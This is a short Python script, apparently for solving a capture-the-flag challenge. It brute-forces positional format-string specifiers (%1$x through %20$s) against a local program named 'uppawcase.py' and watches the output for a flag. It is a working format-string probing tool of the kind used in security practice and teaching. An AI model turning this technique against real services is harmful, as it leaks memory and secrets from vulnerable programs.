#!/usr/bin/env python3

import subprocess

def test_format_string(fmt_str):
    """Test a format string with the original program"""
    try:
        process = subprocess.Popen(['python3', 'uppawcase.py'], 
                                 stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.PIPE,
                                 text=True)
        
        stdout, stderr = process.communicate(input=fmt_str, timeout=10)
        result = stdout.strip()
        
        # Don't print all incorrect results to avoid spam
        if result != "format string: incorrect!":
            print(f"'{fmt_str}' -> {result}")
            return "skbdg{" in result or "FLAG" in result
        
    except subprocess.TimeoutExpired:
        print(f"'{fmt_str}' -> TIMEOUT")
        return False
    except Exception as e:
        print(f"Error testing '{fmt_str}': {e}")
        return False
    
    return False

# Try format strings that access different stack positions
# In format string vulnerabilities, you can often access stack values
candidates = []

# Position-based access to stack
for i in range(1, 21):  # Try positions 1-20
    candidates.extend([
        f"%{i}$c",   # Character at position i
        f"%{i}$d",   # Integer at position i  
        f"%{i}$x",   # Hex at position i
        f"%{i}$p",   # Pointer at position i
        f"%{i}$s",   # String at position i
    ])

# Maybe there's some specific stack value that when interpreted as a character gives us what we want
print("Testing stack access format strings...")

# Test a few at a time to see if we get any interesting results
for i, fmt in enumerate(candidates):
    if len(fmt) <= 30:
        allowed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789%$*.#-+ "
        if all(c in allowed for c in fmt):
            if test_format_string(fmt):
                print(f"SUCCESS! Format string: '{fmt}'")
                break
    
    # Print progress occasionally
    if i % 20 == 0:
        print(f"Tested {i} format strings...")

print("Testing completed.")